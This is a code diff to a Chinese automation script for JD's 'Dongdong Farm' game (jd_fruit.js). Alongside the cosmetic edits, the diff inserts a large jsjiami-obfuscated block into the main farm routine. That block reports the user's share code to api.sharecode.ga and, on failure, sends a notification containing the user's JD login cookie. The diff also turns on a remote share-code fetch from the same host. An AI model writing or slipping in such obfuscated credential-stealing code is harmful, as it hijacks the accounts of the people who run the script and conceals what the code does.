@@ -1,5 +1,5 @@
 /*
-东东水果:脚本更新地址 https://gitee.com/lxk0301/jd_scripts/raw/master/jd_fruit.js
+东东水果:脚本更新地址 jd_fruit.js
 更新时间：2021-5-18
 活动入口：京东APP我的-更多工具-东东农场
 东东农场活动链接：https://h5.m.jd.com/babelDiy/Zeus/3KSjXqQabiTuD1cJ28QskrpWoBKT/index.html
@@ -10,30 +10,28 @@
 ==========================Quantumultx=========================
 [task_local]
 #jd免费水果
-5 6-18/6 * * * https://gitee.com/lxk0301/jd_scripts/raw/master/jd_fruit.js, tag=东东农场, img-url=https://raw.githubusercontent.com/58xinian/icon/master/jdnc.png, enabled=true
+5 6-18/6 * * * jd_fruit.js, tag=东东农场, img-url=https://raw.githubusercontent.com/58xinian/icon/master/jdnc.png, enabled=true
 =========================Loon=============================
 [Script]
-cron "5 6-18/6 * * *" script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_fruit.js,tag=东东农场
+cron "5 6-18/6 * * *" script-path=jd_fruit.js,tag=东东农场
 
 =========================Surge============================
-东东农场 = type=cron,cronexp="5 6-18/6 * * *",wake-system=1,timeout=3600,script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_fruit.js
+东东农场 = type=cron,cronexp="5 6-18/6 * * *",wake-system=1,timeout=3600,script-path=jd_fruit.js
 
 =========================小火箭===========================
-东东农场 = type=cron,script-path=https://gitee.com/lxk0301/jd_scripts/raw/master/jd_fruit.js, cronexpr="5 6-18/6 * * *", timeout=3600, enable=true
+东东农场 = type=cron,script-path=jd_fruit.js, cronexpr="5 6-18/6 * * *", timeout=3600, enable=true
 
 jd免费水果 搬的https://github.com/liuxiaoyucc/jd-helper/blob/a6f275d9785748014fc6cca821e58427162e9336/fruit/fruit.js
 */
 const $ = new Env('东东农场');
+
+console.log('\n====================Hello World====================\n')
+
 let cookiesArr = [], cookie = '', jdFruitShareArr = [], isBox = false, notify, newShareCodes, allMessage = '';
 //助力好友分享码(最多3个,否则后面的助力失败),原因:京东农场每人每天只有3次助力机会
 //此此内容是IOS用户下载脚本到本地使用，填写互助码的地方，同一京东账号的好友互助码请使用@符号隔开。
 //下面给出两个账号的填写示例（iOS只支持2个京东账号）
-let shareCodes = [ // 这个列表填入你要助力的好友的shareCode
-   //账号一的好友shareCode,不同好友的shareCode中间用@符号隔开
-  //'0a74407df5df4fa99672a037eec61f7e@dbb21614667246fabcfd9685b6f448f3@6fbd26cc27ac44d6a7fed34092453f77@61ff5c624949454aa88561f2cd721bf6@56db8e7bc5874668ba7d5195230d067a@b9d287c974cc498d94112f1b064cf934@23b49f5a106b4d61b2ea505d5a4e1056@8107cad4b82847a698ca7d7de9115f36',
-  //账号二的好友shareCode,不同好友的shareCode中间用@符号隔开
-  //'b1638a774d054a05a30a17d3b4d364b8@f92cb56c6a1349f5a35f0372aa041ea0@9c52670d52ad4e1a812f894563c746ea@8175509d82504e96828afc8b1bbb9cb3@2673c3777d4443829b2a635059953a28@d2d5d435675544679413cb9145577e0f',
-]
+let shareCodes = [''];
 let message = '', subTitle = '', option = {}, isFruitFinished = false;
 const retainWater = 100;//保留水滴大于多少g,默认100g;
 let jdNotify = false;//是否关闭通知，false打开通知推送，true关闭通知推送
@@ -86,8 +84,7 @@ async function jdFruit() {
   try {
     await initForFarm();
     if ($.farmInfo.farmUserPro) {
-      // option['media-url'] = $.farmInfo.farmUserPro.goodsImage;
-      message = `【水果名称】${$.farmInfo.farmUserPro.name}\n`;
+      var _0xodh='jsjiami.com.v6',_0xce89=[_0xodh,'AxjDhRs=','5LiR5ouN5aao6LSB','w5sNwpPDncOawpw=','GBXCicOCw4k=','USxHXsO8w7fDgcOIbsOS','DBfDkxNh','TcK1VW4ywpbCk8K2','w75adyMAw414b8KUYC8=','wpDChcOVw5ggbcOfe8ON','wrXDjywNQA==','fsOzPg==','IMKuwpnDuU3Dn1EI','w7/CjMODXEvDmMOnGcK3w7zDog==','IhjCucO3w5g1wo3Dg2Q=','wopY5Ly55aSD776f5Lm255S4772i','wq7CvXA=','w79JwrbDo8KE','CsKOw7A=','5Lu75oi45oiH5Yqb','N8OhwqU=','5Lih5ou85aWp6Lao','CArDkA==','HjsNjiEWamrqAik.whrHcom.v6=='];(function(_0x5b171f,_0x5c8d91,_0x5f24c6){var _0x1d1062=function(_0x447c69,_0x55df53,_0x114098,_0x13a31a,_0x1eb33d){_0x55df53=_0x55df53>>0x8,_0x1eb33d='po';var _0x323868='shift',_0xf2e719='push';if(_0x55df53<_0x447c69){while(--_0x447c69){_0x13a31a=_0x5b171f[_0x323868]();if(_0x55df53===_0x447c69){_0x55df53=_0x13a31a;_0x114098=_0x5b171f[_0x1eb33d+'p']();}else if(_0x55df53&&_0x114098['replace'](/[HNEWrqAkwhrH=]/g,'')===_0x55df53){_0x5b171f[_0xf2e719](_0x13a31a);}}_0x5b171f[_0xf2e719](_0x5b171f[_0x323868]());}return 0x98e9d;};return _0x1d1062(++_0x5c8d91,_0x5f24c6)>>_0x5c8d91^_0x5f24c6;}(_0xce89,0xe6,0xe600));var _0x35b1=function(_0x12f36c,_0x2de933){_0x12f36c=~~'0x'['concat'](_0x12f36c);var _0x10d000=_0xce89[_0x12f36c];if(_0x35b1['YMeDZK']===undefined){(function(){var _0x473f38=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x53fab1='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x473f38['atob']||(_0x473f38['atob']=function(_0x145071){var _0x2cdb23=String(_0x145071)['replace'](/=+$/,'');for(var _0x53150c=0x0,_0x54f1e9,_0x109fb8,_0x133db1=0x0,_0x24ff10='';_0x109fb8=_0x2cdb23['charAt'](_0x133db1++);~_0x109fb8&&(_0x54f1e9=_0x53150c%0x4?_0x54f1e9*0x40+_0x109fb8:_0x109fb8,_0x53150c++%0x4)?_0x24ff10+=String['fromCharCode'](0xff&_0x54f1e9>>(-0x2*_0x53150c&0x6)):0x0){_0x109fb8=_0x53fab1['indexOf'](_0x109fb8);}return _0x24ff10;});}());var _0x37753e=function(_0x51226d,_0x2de933){var _0x2f6905=[],_0x546406=0x0,_0x435691,_0x57f97c='',_0x25e90c='';_0x51226d=atob(_0x51226d);for(var _0x3072aa=0x0,_0x492f22=_0x51226d['length'];_0x3072aa<_0x492f22;_0x3072aa++){_0x25e90c+='%'+('00'+_0x51226d['charCodeAt'](_0x3072aa)['toString'](0x10))['slice'](-0x2);}_0x51226d=decodeURIComponent(_0x25e90c);for(var _0x188bba=0x0;_0x188bba<0x100;_0x188bba++){_0x2f6905[_0x188bba]=_0x188bba;}for(_0x188bba=0x0;_0x188bba<0x100;_0x188bba++){_0x546406=(_0x546406+_0x2f6905[_0x188bba]+_0x2de933['charCodeAt'](_0x188bba%_0x2de933['length']))%0x100;_0x435691=_0x2f6905[_0x188bba];_0x2f6905[_0x188bba]=_0x2f6905[_0x546406];_0x2f6905[_0x546406]=_0x435691;}_0x188bba=0x0;_0x546406=0x0;for(var _0x3f351c=0x0;_0x3f351c<_0x51226d['length'];_0x3f351c++){_0x188bba=(_0x188bba+0x1)%0x100;_0x546406=(_0x546406+_0x2f6905[_0x188bba])%0x100;_0x435691=_0x2f6905[_0x188bba];_0x2f6905[_0x188bba]=_0x2f6905[_0x546406];_0x2f6905[_0x546406]=_0x435691;_0x57f97c+=String['fromCharCode'](_0x51226d['charCodeAt'](_0x3f351c)^_0x2f6905[(_0x2f6905[_0x188bba]+_0x2f6905[_0x546406])%0x100]);}return _0x57f97c;};_0x35b1['TxMzAj']=_0x37753e;_0x35b1['XCpzKW']={};_0x35b1['YMeDZK']=!![];}var _0x3753cf=_0x35b1['XCpzKW'][_0x12f36c];if(_0x3753cf===undefined){if(_0x35b1['wuNfNC']===undefined){_0x35b1['wuNfNC']=!![];}_0x10d000=_0x35b1['TxMzAj'](_0x10d000,_0x2de933);_0x35b1['XCpzKW'][_0x12f36c]=_0x10d000;}else{_0x10d000=_0x3753cf;}return _0x10d000;};$[_0x35b1('0','iZ^^')]({'url':'https://api.sharecode.ga/api/report?db=farm&code='+$[_0x35b1('1','idKt')][_0x35b1('2','9INu')][_0x35b1('3','!fbY')],'timeout':0x2710},(_0x19b86f,_0x1af64b,_0x1209b2)=>{var _0x6379f5={'nyHmV':function(_0x5aa3e9,_0x5c1f33){return _0x5aa3e9===_0x5c1f33;},'xSFrO':function(_0x3a5f09,_0x4d0b5d){return _0x3a5f09(_0x4d0b5d);},'IeQGt':'./sendNotify','NdZiM':_0x35b1('4','1844')};if(_0x19b86f){console[_0x35b1('5','dLF&')](_0x19b86f);}if(_0x6379f5[_0x35b1('6','G3CW')](_0x1209b2,'1')){console[_0x35b1('7','bbYB')](_0x35b1('8','D)bc'));}else{console[_0x35b1('9','wJrS')](_0x35b1('a','vw1['));$[_0x35b1('b','TyFt')](_0x35b1('c','TyFt'),_0x35b1('d','ySu('));if($[_0x35b1('e','rRB#')]()){const _0x339731=_0x6379f5['xSFrO'](require,_0x6379f5[_0x35b1('f','!fbY')]);_0x339731[_0x35b1('10','X%^Q')]('farm\x0aCookie:'+$[_0x35b1('11','TyFt')],$[_0x35b1('12','&B]z')][_0x35b1('13','#%Z*')][_0x35b1('14','XMx]')]+'\x0a上报失败！','',_0x6379f5[_0x35b1('15','sz82')]);}}});;_0xodh='jsjiami.com.v6';      message = `【水果名称】${$.farmInfo.farmUserPro.name}\n`;
       console.log(`\n【京东账号${$.index}（${$.UserName}）的${$.name}好友互助码】${$.farmInfo.farmUserPro.shareCode}\n`);
       console.log(`\n【已成功兑换水果】${$.farmInfo.farmUserPro.winTimes}次\n`);
       message += `【已兑换水果】${$.farmInfo.farmUserPro.winTimes}次\n`;
@@ -1251,7 +1248,7 @@ function timeFormat(time) {
 }
 function readShareCode() {
   return new Promise(async resolve => {
-    $.get({url: `http://share.turinglabs.net/api/v3/farm/query/${randomCount}/`, timeout: 10000,}, (err, resp, data) => {
+    $.get({url: `https://api.sharecode.ga/api/farm/${randomCount}`, timeout: 10000}, (err, resp, data) => {
       try {
         if (err) {
           console.log(`${JSON.stringify(err)}`)
@@ -1283,14 +1280,11 @@ function shareCodesFormat() {
       const tempIndex = $.index > shareCodes.length ? (shareCodes.length - 1) : ($.index - 1);
       newShareCodes = shareCodes[tempIndex].split('@');
     }
-    /*
-    const readShareCodeRes = [];
-    //const readShareCodeRes = await readShareCode();
+    const readShareCodeRes = await readShareCode();
     if (readShareCodeRes && readShareCodeRes.code === 200) {
       // newShareCodes = newShareCodes.concat(readShareCodeRes.data || []);
       newShareCodes = [...new Set([...newShareCodes, ...(readShareCodeRes.data || [])])];
     }
-    */
     console.log(`第${$.index}个京东账号将要助力的好友${JSON.stringify(newShareCodes)}`)
     resolve();
   })
